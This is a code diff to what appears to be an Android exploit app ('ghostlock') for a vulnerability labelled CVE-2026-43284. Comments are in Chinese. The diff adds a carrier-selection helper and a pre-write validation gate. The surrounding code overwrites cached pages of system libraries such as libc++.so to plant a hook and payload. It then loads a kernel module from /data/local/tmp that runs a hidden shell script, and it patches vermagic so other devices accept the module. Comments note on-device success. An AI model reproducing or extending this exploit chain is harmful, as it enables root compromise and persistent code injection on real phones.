@@ -6,6 +6,9 @@ import com.ghostlock.app.core.generated.HookPlanRequest43284
 import com.ghostlock.app.core.generated.Init43284
 import com.ghostlock.app.core.generated.ModuleCheck43284
 import com.ghostlock.app.jni.cve43284.Assembled43284
+import com.ghostlock.app.jni.cve43284.CarrierCandidates
+import com.ghostlock.app.jni.cve43284.PlanCheck
+import com.ghostlock.app.jni.cve43284.PlanClosure
 import com.ghostlock.app.jni.cve43284.SequenceContinuation
 import com.ghostlock.app.jni.cve43284.TriggerSpec43284
 import com.ghostlock.app.jni.cve43284.WaitPolicy43284
@@ -38,6 +41,13 @@ import com.ghostlock.app.log.GhostLog
 object TypedBackendProbe {
     /** 探针日志的 logcat 标签。 */
     const val TAG = "GhostlockTyped"
+
+    /**
+     *  模块镜像的固定落点：闭包校验的镜像区与下面真正读的那份文件必须是同一个常量。
+     *
+     *  12304 B 这份在本机写链上能完整写进载体（2026-10-16 23:33 真机记录：module wrote=true）。
+     */
+    private const val MODULE_PATH = "/data/local/tmp/ghostlock.ko"
 
     /**
      *  一步的**前后各一行**日志：调用了什么 + 参数（前），返回 + 耗时 ms（后）。
@@ -918,6 +928,14 @@ object TypedBackendProbe {
             return
         }
         /*
+         * 载体选择：**选择逻辑只在 CarrierCandidates 一处**（参照 ghostlock-app-ref@5f184760 的
+         * src/core/backend/cve_2026_43284/execution_binding.cpp:141-148：profile 的 carrier_path 优先，
+         * 缺省走 steps/chain.hpp:69-75 的四个默认载体）。当前实现与从前一样只取第一项；
+         * 这里多出来的只是 readable 标记与一行日志（backend_terminal.cpp:318-331：只绑一个载体、不回退）。
+         */
+        val carrier = CarrierCandidates.select()
+        step(carrier.line())
+        /*
          * 整条链**一个**序号计数器（ref 的 ctx->page.next_seq 在整次运行里是唯一的）：
          *   - ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/real_ops.cpp:250-257（patch#1 先借后还）
          *   - 同文件 :307-327（hook 页借载体序号，写完结回）
@@ -1219,6 +1237,12 @@ object TypedBackendProbe {
         /* 终点恢复要用的两样：本次 hook 会话与本次 plan（在 hook 段里赋值，段外无条件用它）。 */
         var hookForRestore: Assembled43284? = null
         var hookPlanWordsForRestore: LongArray? = null
+        /*
+         * 写入前的闭包闸门（纯 Kotlin，参照 ghostlock-app-ref@5f184760 的
+         * src/core/backend/cve_2026_43284/steps/chain.cpp:390-435）：null = 还没算；ok=false ⇒ 三个区域一个字节都不写。
+         * 它是本次运行的**局部变量**，不是全局状态。
+         */
+        var planGate: PlanCheck? = null
         /* ① hook 段：同一条 SA、同一条 ESP 套接字；目标是 /system/lib64/libc++.so 的 sentry 站点。 */
         val hookOutcome = runCatching {
             meter.before("Native43284.create", "(hook session)")
@@ -1290,6 +1314,45 @@ meter.after(
         " refusal=" + hook.lastRefusal,
 )
 hookPlanWordsForRestore = hookPlanWords
+/*
+ * 写入前的**闭包校验**（本批之一，纯 Kotlin）：镜像区 / 载荷区 / 站点块必须都在载体里、互不重叠、
+ * 站点块整块可写。参照 ghostlock-app-ref@5f184760 的
+ * src/core/backend/cve_2026_43284/steps/chain.cpp:390-435（validate_plan_closure）与
+ * 同文件 :184-199（apply_plan 在写第一个字节之前调用它 —— 闭包不通过就一个块都不写）。
+ *
+ * 三个写点（writeHook / 载荷 writeImage / 模块 writeImage）都以 planGate.ok 为前置：
+ * 失败时只打一行 `typed: <refusal>`，然后**一个区域都不写**。
+ * 载体大小：用 CarrierCandidates 的**声明上界** 32 MiB，而不是载体 stat 真值 ——
+ * 合并计划的载荷 / 站点落在 libc++（约 1 MiB 偏移），vendor 载体真值比它小，会误判成容量不足；
+ * ref 在这台机器上 stat 也给 0（execution_binding.cpp:184-188），0 同样不能用。
+ */
+runCatching {
+    val planPayload = hook.image(Assembled43284.ROLE_IMAGE_LANDING_PAYLOAD)
+    val moduleLength = java.io.File(MODULE_PATH).length()
+    val checked = if (hookPlanWords != null && hookPlanWords.size >= 4) {
+        PlanClosure.check(
+            carrierPath = carrier.path,
+            carrierSize = CarrierCandidates.DECLARED_SIZE_BYTES,
+            imageSize = if (moduleLength > 0L) moduleLength else 0L,
+            imageOffset = 0L,
+            payloadOffset = hookPlanWords[3],
+            payloadSize = (planPayload?.size ?: 0).toLong(),
+            siteOffset = hookPlanWords[2],
+            width = Assembled43284.BLOCK.toLong(),
+        )
+    } else {
+        PlanCheck(false, "plan:hook-plan-unavailable", "plan: unavailable (hook plan missing)")
+    }
+    planGate = checked
+    if (checked.ok) {
+        step(checked.summary)
+    } else {
+        step("typed: " + checked.refusal)
+    }
+}.onFailure { problem ->
+    planGate = PlanCheck(false, "plan:check-refused", "plan: unavailable")
+    step("typed: plan:check-refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+}
 /** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
  * older code left there aims 0xC short of the payload entry. Force the word to the one this run
  * needs; rewriteSiteBranch does not look at the displaced instruction, it just writes the word. */
@@ -1359,7 +1422,12 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
             meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt2 + " seq=" + seq.value)
             step("typed: hook adopt=" + hookAdopt2 + " seq=" + seq.value)
             meter.before("Assembled43284.writeHook", "width=16 seq=" + seq.value)
-            val hookWrote = hook.writeHook(16L, saInit(seq.value))  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
+            /* 闸门是三个写点的共同前置：闭包没通过就一个区域都不写（planGate 见上面的闭包校验）。 */
+            val hookWrote = if (planGate?.ok == true) {
+                hook.writeHook(16L, saInit(seq.value))  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
+            } else {
+                false
+            }
             meter.after("Assembled43284.writeHook", "ok=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
@@ -1374,12 +1442,12 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
 step("typed: hook landing=" + hookLanding)
 /* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
 meter.before("Assembled43284.fillPayloadSlots", "carrier=/system/lib64/libc++.so hookFileOffset=0x" + (if (hookPlanWords != null) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
-val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/vendor/lib64/libbinderdebug.so"   /* 与 5f18476 同款载体；参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
+val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = carrier.path   /* 与 5f18476 同款载体（默认仍是 /vendor/lib64/libbinderdebug.so；选择集中在 CarrierCandidates）；参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
 meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
 step("typed: hook payload slots=" + payloadSlots)
 meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
 /* 序号来自会话（写成功一次就自动推进一次，ref real_ops.cpp:307-327），这里不再回查 native。 */
-val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16L, saInit(seq.value)) else false
+val payloadWrote = if (planGate?.ok == true) hook.writeImage(payload, hookLanding, 16L, saInit(seq.value)) else false
 meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     /* 参考顺序的第二步（dev hook_patch 137-186）：先存原文，再写包裹站点的那一整块，
@@ -1452,7 +1520,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                  * 两份 .ko 的 UMH 逻辑与命令行相同（都跑 `/data/local/tmp/.ghostlock_lkm_cmd.sh`），
                  * 所以先把“能完整写进去”这份立住，再单独查 insmod 为什么没把模块带起来。
                  */
-                val moduleBytesRaw = java.io.File("/data/local/tmp/ghostlock.ko").readBytes()
+                val moduleBytesRaw = java.io.File(MODULE_PATH).readBytes()
                 /*
                  * vermagic 必须等于本机 UTS_RELEASE + 选项串，否则别的机型会拒载；同一 minor 布局一致，
                  * 所以这里按“同 minor 直接改名”处理（参照 ghostlock-app-ref@5f184760 的 lkm_image.cpp：
@@ -1467,7 +1535,8 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                  * 参照实现也是这样做的（pagecache.cpp:158-165 的 old_page 回退 + :231 的 helper splice16），
                  * 块数是 769，参照那次是 1470 块；两者的差别只在身份/环境，不在算法。
                  */
-                val carrierPath = "/vendor/lib64/libbinderdebug.so"
+                /* 机械改动：字面量换成选择结果（默认仍是同一路径，见 CarrierCandidates.select）。 */
+                val carrierPath = carrier.path
                 meter.before("Native43284.create", "(module session)")
                 val moduleHandle = Native43284.create()
                 meter.after("Native43284.create", "handle=" + moduleHandle)
@@ -1494,7 +1563,8 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + moduleBytes.size + " (module -> carrier)")
-                val moduleWrote = module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value))
+                /* 闸门关着就不写模块：闭包没通过时写进去的模块也没有钩子会 insmod 它。 */
+                val moduleWrote = if (planGate?.ok == true) module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value)) else false
                 meter.after("Assembled43284.writeImage", "ok=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
             /*
@@ -1517,7 +1587,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
              * write 行 hook=0、trigger 行 hook=1）。所以这里在触发前**重新应用站点块**，
              * 保证被踩的那一刻钩子确实在页里，而不是更早写下的那一份。
              */
-            if (hookPlanWords != null && hookPlanWords.size >= 4) {
+            if (planGate?.ok == true && hookPlanWords != null && hookPlanWords.size >= 4) {
                 runCatching {
                     val siteNow = hookPlanWords[2]
                     val blkNow = siteNow - (siteNow % 16L)
